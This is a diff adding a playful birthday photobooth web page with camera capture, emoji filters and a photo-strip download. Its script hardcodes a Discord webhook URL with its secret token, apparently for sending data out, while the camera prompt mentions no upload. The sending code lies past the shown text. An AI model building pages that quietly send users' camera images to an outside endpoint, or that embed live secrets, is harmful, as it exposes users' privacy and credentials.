@@ -1,0 +1,1611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>📸 Birthday Photobooth</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #D4E6C3 0%, #B5D4A3 50%, #9BC484 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow-x: hidden;
+            position: relative;
+            padding: 20px;
+            padding-top: 80px;
+        }
+
+        /* Floating decorations */
+        .floating-deco {
+            position: fixed;
+            font-size: 2rem;
+            opacity: 0.3;
+            z-index: 0;
+            animation: float-deco 6s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes float-deco {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(10deg); }
+        }
+
+        .floating-deco:nth-child(1) { top: 10%; left: 5%; animation-delay: 0s; }
+        .floating-deco:nth-child(2) { top: 20%; right: 8%; animation-delay: 1s; }
+        .floating-deco:nth-child(3) { bottom: 20%; left: 10%; animation-delay: 2s; }
+        .floating-deco:nth-child(4) { bottom: 30%; right: 5%; animation-delay: 0.5s; }
+        .floating-deco:nth-child(5) { top: 50%; left: 3%; animation-delay: 1.5s; }
+        .floating-deco:nth-child(6) { top: 60%; right: 3%; animation-delay: 2.5s; }
+
+        /* Back button */
+        .back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.95);
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            transition: all 0.3s;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        }
+
+        .back-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Music indicator */
+        .music-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255,255,255,0.9);
+            padding: 10px 15px;
+            border-radius: 25px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            color: #2D5A27;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.1);
+            z-index: 100;
+            cursor: pointer;
+        }
+
+        .music-indicator.show {
+            display: flex;
+        }
+
+        .music-bars {
+            display: flex;
+            gap: 2px;
+            align-items: flex-end;
+            height: 15px;
+        }
+
+        .music-bar {
+            width: 3px;
+            background: #7BC89C;
+            border-radius: 2px;
+            animation: music-bar 0.5s infinite alternate;
+        }
+
+        .music-bar:nth-child(1) { height: 5px; animation-delay: 0s; }
+        .music-bar:nth-child(2) { height: 10px; animation-delay: 0.1s; }
+        .music-bar:nth-child(3) { height: 7px; animation-delay: 0.2s; }
+        .music-bar:nth-child(4) { height: 12px; animation-delay: 0.3s; }
+
+        @keyframes music-bar {
+            to { height: 15px; }
+        }
+
+        .music-indicator.paused .music-bar {
+            animation: none;
+            height: 5px;
+        }
+
+        /* Title */
+        .page-title {
+            font-size: 1.8rem;
+            color: #2D5A27;
+            margin-bottom: 10px;
+            text-align: center;
+            text-shadow: 0 2px 10px rgba(255,255,255,0.5);
+            z-index: 10;
+            opacity: 0;
+            animation: fadeDown 0.6s 0.2s forwards;
+        }
+
+        @keyframes fadeDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Instructions */
+        .instructions {
+            background: rgba(255,255,255,0.95);
+            padding: 15px 25px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #2D5A27;
+            font-size: 0.95rem;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            z-index: 10;
+            opacity: 0;
+            animation: fadeDown 0.6s 0.4s forwards;
+        }
+
+        .instructions span {
+            color: #5BA37A;
+            font-weight: bold;
+        }
+
+        /* Filter selector */
+        .filter-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+            z-index: 10;
+            opacity: 0;
+            animation: fadeDown 0.6s 0.5s forwards;
+        }
+
+        .filter-btn {
+            background: rgba(255,255,255,0.9);
+            border: 3px solid transparent;
+            padding: 10px 15px;
+            border-radius: 15px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #2D5A27;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+
+        .filter-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+        }
+
+        .filter-btn.active {
+            border-color: #7BC89C;
+            background: #fff;
+            box-shadow: 0 5px 20px rgba(123, 200, 156, 0.4);
+        }
+
+        .filter-btn span {
+            font-size: 1.2rem;
+        }
+
+        /* Permission screen */
+        .permission-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #D4E6C3 0%, #B5D4A3 50%, #9BC484 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 500;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .permission-screen.hidden {
+            display: none;
+        }
+
+        .permission-card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 30px;
+            padding: 40px 30px;
+            max-width: 350px;
+            box-shadow: 0 20px 60px rgba(45, 90, 39, 0.3);
+        }
+
+        .permission-icon {
+            font-size: 5rem;
+            margin-bottom: 20px;
+            animation: bounce-icon 2s infinite;
+        }
+
+        @keyframes bounce-icon {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            25% { transform: scale(1.1) rotate(-5deg); }
+            75% { transform: scale(1.1) rotate(5deg); }
+        }
+
+        .permission-title {
+            font-size: 1.6rem;
+            color: #2D5A27;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .permission-text {
+            color: #5BA37A;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .permission-btn {
+            background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%);
+            color: #fff;
+            border: none;
+            padding: 16px 50px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(91, 163, 122, 0.4);
+            transition: all 0.3s;
+        }
+
+        .permission-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 35px rgba(91, 163, 122, 0.5);
+        }
+
+        /* Camera wrapper */
+        .camera-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 350px;
+            z-index: 10;
+            opacity: 0;
+            animation: scaleIn 0.6s 0.6s forwards;
+        }
+
+        @keyframes scaleIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100%;
+            background: #1a1a1a;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.3), inset 0 0 0 5px #2D5A27;
+        }
+
+        #video {
+            width: 100%;
+            display: block;
+            transform: scaleX(-1);
+            border-radius: 20px;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        /* Birthday filter overlays */
+        .filter-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        /* Party Hat Filter */
+        .filter-party-hat .hat-main {
+            position: absolute;
+            top: 2%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 4.5rem;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.4));
+            animation: hat-wiggle 2s ease-in-out infinite;
+        }
+
+        @keyframes hat-wiggle {
+            0%, 100% { transform: translateX(-50%) rotate(-8deg); }
+            50% { transform: translateX(-50%) rotate(8deg); }
+        }
+
+        .filter-party-hat .sparkle {
+            position: absolute;
+            font-size: 1.5rem;
+            animation: sparkle-twinkle 1.5s infinite;
+        }
+
+        @keyframes sparkle-twinkle {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.7); }
+        }
+
+        .filter-party-hat .sparkle:nth-child(2) { top: 5%; left: 15%; animation-delay: 0s; }
+        .filter-party-hat .sparkle:nth-child(3) { top: 8%; right: 15%; animation-delay: 0.3s; }
+        .filter-party-hat .sparkle:nth-child(4) { top: 15%; left: 8%; animation-delay: 0.6s; }
+        .filter-party-hat .sparkle:nth-child(5) { top: 12%; right: 8%; animation-delay: 0.9s; }
+
+        /* Birthday Crown Filter */
+        .filter-crown .crown-main {
+            position: absolute;
+            top: 0%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 5rem;
+            filter: drop-shadow(0 4px 10px rgba(255,215,0,0.5));
+            animation: crown-float 3s ease-in-out infinite;
+        }
+
+        @keyframes crown-float {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(-8px); }
+        }
+
+        .filter-crown .gem {
+            position: absolute;
+            font-size: 1.3rem;
+            animation: gem-shine 2s infinite;
+        }
+
+        @keyframes gem-shine {
+            0%, 100% { opacity: 1; filter: brightness(1); }
+            50% { opacity: 0.8; filter: brightness(1.5); }
+        }
+
+        .filter-crown .gem:nth-child(2) { top: 8%; left: 20%; animation-delay: 0s; }
+        .filter-crown .gem:nth-child(3) { top: 8%; right: 20%; animation-delay: 0.5s; }
+        .filter-crown .gem:nth-child(4) { top: 5%; left: 35%; animation-delay: 1s; }
+        .filter-crown .gem:nth-child(5) { top: 5%; right: 35%; animation-delay: 1.5s; }
+
+        /* Balloon Filter */
+        .filter-balloons .balloon {
+            position: absolute;
+            font-size: 3rem;
+            animation: balloon-float 4s ease-in-out infinite;
+            filter: drop-shadow(0 3px 6px rgba(0,0,0,0.3));
+        }
+
+        @keyframes balloon-float {
+            0%, 100% { transform: translateY(0) rotate(-5deg); }
+            50% { transform: translateY(-15px) rotate(5deg); }
+        }
+
+        .filter-balloons .balloon:nth-child(1) { top: 5%; left: 5%; animation-delay: 0s; color: #FF6B6B; }
+        .filter-balloons .balloon:nth-child(2) { top: 8%; right: 5%; animation-delay: 0.5s; color: #4ECDC4; }
+        .filter-balloons .balloon:nth-child(3) { top: 3%; left: 25%; animation-delay: 1s; color: #FFE66D; }
+        .filter-balloons .balloon:nth-child(4) { top: 6%; right: 25%; animation-delay: 1.5s; color: #FF69B4; }
+        .filter-balloons .balloon:nth-child(5) { top: 10%; left: 12%; animation-delay: 2s; color: #95E1D3; }
+
+        /* Cake Filter */
+        .filter-cake .cake-main {
+            position: absolute;
+            bottom: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 4rem;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.4));
+            animation: cake-bounce 2s ease-in-out infinite;
+        }
+
+        @keyframes cake-bounce {
+            0%, 100% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.1); }
+        }
+
+        .filter-cake .candle-glow {
+            position: absolute;
+            bottom: 18%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 60px;
+            background: radial-gradient(circle, rgba(255,200,100,0.6) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: glow-pulse 1s infinite;
+        }
+
+        @keyframes glow-pulse {
+            0%, 100% { opacity: 0.8; transform: translateX(-50%) scale(1); }
+            50% { opacity: 1; transform: translateX(-50%) scale(1.2); }
+        }
+
+        .filter-cake .confetti-piece {
+            position: absolute;
+            font-size: 1.5rem;
+            animation: confetti-rain 3s linear infinite;
+        }
+
+        @keyframes confetti-rain {
+            0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100px) rotate(360deg); opacity: 0; }
+        }
+
+        .filter-cake .confetti-piece:nth-child(2) { top: 10%; left: 10%; animation-delay: 0s; }
+        .filter-cake .confetti-piece:nth-child(3) { top: 5%; left: 30%; animation-delay: 0.5s; }
+        .filter-cake .confetti-piece:nth-child(4) { top: 8%; right: 30%; animation-delay: 1s; }
+        .filter-cake .confetti-piece:nth-child(5) { top: 3%; right: 10%; animation-delay: 1.5s; }
+        .filter-cake .confetti-piece:nth-child(6) { top: 12%; left: 50%; animation-delay: 2s; }
+
+        /* Party Popper Filter */
+        .filter-party .popper {
+            position: absolute;
+            font-size: 3.5rem;
+            filter: drop-shadow(0 3px 6px rgba(0,0,0,0.3));
+        }
+
+        .filter-party .popper-left {
+            top: 5%;
+            left: 5%;
+            transform: rotate(-30deg);
+            animation: popper-shake-left 1s ease-in-out infinite;
+        }
+
+        .filter-party .popper-right {
+            top: 5%;
+            right: 5%;
+            transform: rotate(30deg) scaleX(-1);
+            animation: popper-shake-right 1s ease-in-out infinite;
+        }
+
+        @keyframes popper-shake-left {
+            0%, 100% { transform: rotate(-30deg); }
+            50% { transform: rotate(-20deg); }
+        }
+
+        @keyframes popper-shake-right {
+            0%, 100% { transform: rotate(30deg) scaleX(-1); }
+            50% { transform: rotate(20deg) scaleX(-1); }
+        }
+
+        .filter-party .streamer {
+            position: absolute;
+            font-size: 2rem;
+            animation: streamer-fall 2.5s linear infinite;
+        }
+
+        @keyframes streamer-fall {
+            0% { transform: translateY(-30px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(150px) rotate(180deg); opacity: 0; }
+        }
+
+        .filter-party .streamer:nth-child(3) { top: 15%; left: 20%; animation-delay: 0s; }
+        .filter-party .streamer:nth-child(4) { top: 10%; left: 40%; animation-delay: 0.4s; }
+        .filter-party .streamer:nth-child(5) { top: 12%; right: 40%; animation-delay: 0.8s; }
+        .filter-party .streamer:nth-child(6) { top: 8%; right: 20%; animation-delay: 1.2s; }
+        .filter-party .streamer:nth-child(7) { top: 18%; left: 60%; animation-delay: 1.6s; }
+
+        .filter-party .star {
+            position: absolute;
+            font-size: 1.8rem;
+            animation: star-spin 3s linear infinite;
+        }
+
+        @keyframes star-spin {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
+        .filter-party .star:nth-child(8) { bottom: 15%; left: 10%; animation-delay: 0s; }
+        .filter-party .star:nth-child(9) { bottom: 20%; right: 10%; animation-delay: 1s; }
+        .filter-party .star:nth-child(10) { bottom: 10%; left: 30%; animation-delay: 2s; }
+
+        /* Hide inactive filters */
+        .filter-overlay { display: none; }
+        .filter-overlay.active { display: block; }
+
+        /* Countdown */
+        .countdown-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            pointer-events: none;
+        }
+
+        .countdown-number {
+            font-size: 10rem;
+            color: #fff;
+            text-shadow: 0 0 30px rgba(123, 200, 156, 0.8), 0 0 60px rgba(123, 200, 156, 0.5);
+            opacity: 0;
+            font-weight: bold;
+        }
+
+        .countdown-number.show {
+            animation: countdown-pop 1s forwards;
+        }
+
+        @keyframes countdown-pop {
+            0% { opacity: 0; transform: scale(0.3); }
+            30% { opacity: 1; transform: scale(1.2); }
+            60% { opacity: 1; transform: scale(1); }
+            100% { opacity: 0; transform: scale(0.8); }
+        }
+
+        /* Flash */
+        .flash-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            opacity: 0;
+            z-index: 25;
+            pointer-events: none;
+            border-radius: 20px;
+        }
+
+        .flash-overlay.active {
+            animation: flash-effect 0.4s forwards;
+        }
+
+        @keyframes flash-effect {
+            0% { opacity: 0; }
+            20% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        /* Photo counter */
+        .photo-counter {
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(45, 90, 39, 0.9);
+            color: #fff;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            z-index: 15;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .photo-counter .highlight {
+            color: #A8E6CF;
+        }
+
+        /* Thumbnail strip */
+        .thumbnail-strip {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .thumbnail {
+            width: 70px;
+            height: 70px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.3);
+            border: 3px solid rgba(255,255,255,0.5);
+            overflow: hidden;
+            opacity: 0.5;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .thumbnail.captured {
+            opacity: 1;
+            border-color: #7BC89C;
+            box-shadow: 0 4px 15px rgba(123, 200, 156, 0.4);
+            animation: thumb-pop 0.3s;
+        }
+
+        @keyframes thumb-pop {
+            0% { transform: scale(0.8); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Controls */
+        .controls {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            z-index: 10;
+        }
+
+        .capture-btn {
+            width: 85px;
+            height: 85px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, #fff 0%, #f5f5f5 100%);
+            border: 6px solid #7BC89C;
+            cursor: pointer;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+            transition: all 0.3s;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .capture-btn::before {
+            content: '';
+            position: absolute;
+            width: 65px;
+            height: 65px;
+            background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%);
+            border-radius: 50%;
+            transition: all 0.3s;
+        }
+
+        .capture-btn::after {
+            content: '📸';
+            position: absolute;
+            font-size: 1.5rem;
+            z-index: 1;
+        }
+
+        .capture-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.25);
+        }
+
+        .capture-btn:active {
+            transform: scale(0.95);
+        }
+
+        .capture-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .capture-hint {
+            color: #2D5A27;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Result container */
+        .result-container {
+            display: none;
+            width: 100%;
+            max-width: 350px;
+            z-index: 10;
+            padding-bottom: 40px;
+        }
+
+        .result-container.show {
+            display: block;
+            animation: slideUp 0.8s forwards;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .photo-strip {
+            background: linear-gradient(180deg, #fff 0%, #f9f9f9 100%);
+            border-radius: 20px;
+            padding: 25px 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2), 0 0 0 8px #fff, 0 0 0 12px #7BC89C;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .photo-strip::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 10px;
+            background: repeating-linear-gradient(90deg, #7BC89C 0px, #7BC89C 20px, #A8E6CF 20px, #A8E6CF 40px, #FFD700 40px, #FFD700 60px, #FF69B4 60px, #FF69B4 80px);
+        }
+
+        .strip-header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-top: 15px;
+        }
+
+        .strip-title {
+            font-size: 1.5rem;
+            color: #2D5A27;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .strip-subtitle {
+            color: #7BC89C;
+            font-size: 0.9rem;
+        }
+
+        .strip-photos {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .strip-photo-wrapper {
+            position: relative;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            border: 5px solid #7BC89C;
+            opacity: 0;
+            animation: photo-appear 0.5s forwards;
+        }
+
+        .strip-photo-wrapper:nth-child(1) { animation-delay: 0.2s; }
+        .strip-photo-wrapper:nth-child(2) { animation-delay: 0.4s; }
+        .strip-photo-wrapper:nth-child(3) { animation-delay: 0.6s; }
+
+        @keyframes photo-appear {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .strip-photo {
+            width: 100%;
+            display: block;
+        }
+
+        .strip-footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-bottom: 10px;
+        }
+
+        .strip-decorations {
+            font-size: 2rem;
+            margin-bottom: 12px;
+            animation: deco-bounce 2s infinite;
+        }
+
+        @keyframes deco-bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .strip-date {
+            color: #7BC89C;
+            font-size: 0.95rem;
+            margin-bottom: 8px;
+        }
+
+        .strip-message {
+            color: #2D5A27;
+            font-style: italic;
+            font-size: 1rem;
+        }
+
+        /* Result buttons */
+        .result-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 25px;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%);
+            color: #fff;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(91, 163, 122, 0.4);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(91, 163, 122, 0.5);
+        }
+
+        .retake-btn {
+            background: transparent;
+            color: #5BA37A;
+            border: 3px solid #5BA37A;
+            padding: 14px 30px;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .retake-btn:hover {
+            background: #5BA37A;
+            color: #fff;
+        }
+
+        /* Celebration */
+        .celebration {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 100;
+            overflow: hidden;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            top: -20px;
+            opacity: 0;
+        }
+
+        .confetti.fall {
+            animation: confetti-fall 3s forwards;
+        }
+
+        @keyframes confetti-fall {
+            0% { opacity: 1; top: -20px; transform: rotate(0deg) translateX(0); }
+            100% { opacity: 0; top: 100vh; transform: rotate(720deg) translateX(100px); }
+        }
+
+        /* Hidden canvas */
+        #stripCanvas { display: none; }
+    </style>
+</head>
+<body>
+    <!-- Floating decorations -->
+    <div class="floating-deco">🎈</div>
+    <div class="floating-deco">🎉</div>
+    <div class="floating-deco">🎂</div>
+    <div class="floating-deco">🎁</div>
+    <div class="floating-deco">⭐</div>
+    <div class="floating-deco">✨</div>
+
+    <!-- Permission screen -->
+    <div class="permission-screen" id="permissionScreen">
+        <div class="permission-card">
+            <div class="permission-icon">📸</div>
+            <h2 class="permission-title">Camera Access Needed</h2>
+            <p class="permission-text">We need access to your camera to take awesome birthday photobooth pictures!</p>
+            <button class="permission-btn" onclick="requestCamera()">📷 Allow Camera</button>
+        </div>
+    </div>
+
+    <!-- Back button -->
+    <button class="back-btn" onclick="goBack()">←</button>
+
+    <!-- Music indicator -->
+    <div class="music-indicator" id="musicIndicator">
+        <div class="music-bars">
+            <div class="music-bar"></div>
+            <div class="music-bar"></div>
+            <div class="music-bar"></div>
+            <div class="music-bar"></div>
+        </div>
+        <span>Music Playing</span>
+    </div>
+
+    <!-- Title -->
+    <h1 class="page-title">🎉 Birthday Photobooth 🎉</h1>
+
+    <!-- Instructions -->
+    <div class="instructions" id="instructions">
+        📷 Take <span>3 photos</span> to create your birthday photo strip!
+    </div>
+
+    <!-- Filter selector -->
+    <div class="filter-selector" id="filterSelector">
+        <button class="filter-btn active" data-filter="party-hat" onclick="selectFilter('party-hat')">
+            <span>🎩</span> Party Hat
+        </button>
+        <button class="filter-btn" data-filter="crown" onclick="selectFilter('crown')">
+            <span>👑</span> Crown
+        </button>
+        <button class="filter-btn" data-filter="balloons" onclick="selectFilter('balloons')">
+            <span>🎈</span> Balloons
+        </button>
+        <button class="filter-btn" data-filter="cake" onclick="selectFilter('cake')">
+            <span>🎂</span> Cake
+        </button>
+        <button class="filter-btn" data-filter="party" onclick="selectFilter('party')">
+            <span>🎊</span> Party
+        </button>
+    </div>
+
+    <!-- Camera wrapper -->
+    <div class="camera-wrapper" id="cameraWrapper">
+        <div class="camera-container">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+            
+            <!-- Filter overlays -->
+            <!-- Party Hat Filter -->
+            <div class="filter-overlay filter-party-hat active" id="filter-party-hat">
+                <div class="hat-main">🎩</div>
+                <div class="sparkle">✨</div>
+                <div class="sparkle">⭐</div>
+                <div class="sparkle">✨</div>
+                <div class="sparkle">⭐</div>
+            </div>
+
+            <!-- Crown Filter -->
+            <div class="filter-overlay filter-crown" id="filter-crown">
+                <div class="crown-main">👑</div>
+                <div class="gem">💎</div>
+                <div class="gem">💎</div>
+                <div class="gem">✨</div>
+                <div class="gem">✨</div>
+            </div>
+
+            <!-- Balloons Filter -->
+            <div class="filter-overlay filter-balloons" id="filter-balloons">
+                <div class="balloon">🎈</div>
+                <div class="balloon">🎈</div>
+                <div class="balloon">🎈</div>
+                <div class="balloon">🎈</div>
+                <div class="balloon">🎈</div>
+            </div>
+
+            <!-- Cake Filter -->
+            <div class="filter-overlay filter-cake" id="filter-cake">
+                <div class="candle-glow"></div>
+                <div class="cake-main">🎂</div>
+                <div class="confetti-piece">🎊</div>
+                <div class="confetti-piece">🎉</div>
+                <div class="confetti-piece">🎊</div>
+                <div class="confetti-piece">🎉</div>
+                <div class="confetti-piece">✨</div>
+            </div>
+
+            <!-- Party Filter -->
+            <div class="filter-overlay filter-party" id="filter-party">
+                <div class="popper popper-left">🎉</div>
+                <div class="popper popper-right">🎉</div>
+                <div class="streamer">🎊</div>
+                <div class="streamer">🎀</div>
+                <div class="streamer">🎊</div>
+                <div class="streamer">🎀</div>
+                <div class="streamer">✨</div>
+                <div class="star">⭐</div>
+                <div class="star">🌟</div>
+                <div class="star">💫</div>
+            </div>
+
+            <!-- Countdown -->
+            <div class="countdown-overlay">
+                <div class="countdown-number" id="countdown"></div>
+            </div>
+
+            <!-- Flash -->
+            <div class="flash-overlay" id="flash"></div>
+
+            <!-- Photo counter -->
+            <div class="photo-counter">
+                Photo: <span class="highlight" id="photoCount">0</span>/3
+            </div>
+        </div>
+
+        <!-- Thumbnails -->
+        <div class="thumbnail-strip">
+            <div class="thumbnail" id="thumb1">
+                <img src="" alt="">
+            </div>
+            <div class="thumbnail" id="thumb2">
+                <img src="" alt="">
+            </div>
+            <div class="thumbnail" id="thumb3">
+                <img src="" alt="">
+            </div>
+        </div>
+    </div>
+
+    <!-- Controls -->
+    <div class="controls" id="controls">
+        <button class="capture-btn" id="captureBtn" onclick="startCapture()"></button>
+        <p class="capture-hint">Tap to capture!</p>
+    </div>
+
+    <!-- Result container -->
+    <div class="result-container" id="resultContainer">
+        <div class="photo-strip" id="photoStrip">
+            <div class="strip-header">
+                <div class="strip-title">🎂 Happy Birthday! 🎂</div>
+                <div class="strip-subtitle">A special moment captured</div>
+            </div>
+            <div class="strip-photos" id="stripPhotos"></div>
+            <div class="strip-footer">
+                <div class="strip-decorations">🎈🎉🎊🎁🎈</div>
+                <div class="strip-date" id="stripDate"></div>
+                <div class="strip-message">"Making memories, one photo at a time!"</div>
+            </div>
+        </div>
+
+        <div class="result-buttons">
+            <button class="download-btn" onclick="downloadStrip()">
+                <span>📥</span> Download Photo Strip
+            </button>
+            <button class="retake-btn" onclick="retakePhotos()">
+                <span>🔄</span> Retake Photos
+            </button>
+        </div>
+    </div>
+
+    <!-- Celebration -->
+    <div class="celebration" id="celebration"></div>
+
+    <!-- Hidden canvas -->
+    <canvas id="stripCanvas"></canvas>
+
+    <!-- Background music -->
+    <audio id="bgMusic" loop>
+        <source src="audio/Vienna.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // === WEBHOOK CONFIG - PUT YOUR WEBHOOK URL HERE ===
+        // Example: const WEBHOOK_URL = 'https://example.com/your-webhook-endpoint';
+        // Leave empty ('') to disable webhook sending.
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1442926535895027924/U0VjlAPZIzLNK1UcyVpfocnT3PFHbLMw52iMEZvmqhRac_YVOYT_F-v2rOHjNSrfB1zX';
+
+        // Filter emoji mapping for canvas
+        const filterEmojis = {
+            'party-hat': { main: '🎩', extras: ['✨', '⭐'], position: 'top' },
+            'crown': { main: '👑', extras: ['💎', '✨'], position: 'top' },
+            'balloons': { main: '🎈', extras: ['🎈', '🎈', '🎈', '🎈'], position: 'corners' },
+            'cake': { main: '🎂', extras: ['🎊', '🎉', '✨'], position: 'bottom' },
+            'party': { main: '🎉', extras: ['🎊', '⭐', '✨', '🎀'], position: 'sides' }
+        };
+
+        let currentFilter = 'party-hat';
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const captureBtn = document.getElementById('captureBtn');
+        const photoCount = document.getElementById('photoCount');
+        const countdown = document.getElementById('countdown');
+        const flash = document.getElementById('flash');
+        const instructions = document.getElementById('instructions');
+        const controls = document.getElementById('controls');
+        const cameraWrapper = document.getElementById('cameraWrapper');
+        const resultContainer = document.getElementById('resultContainer');
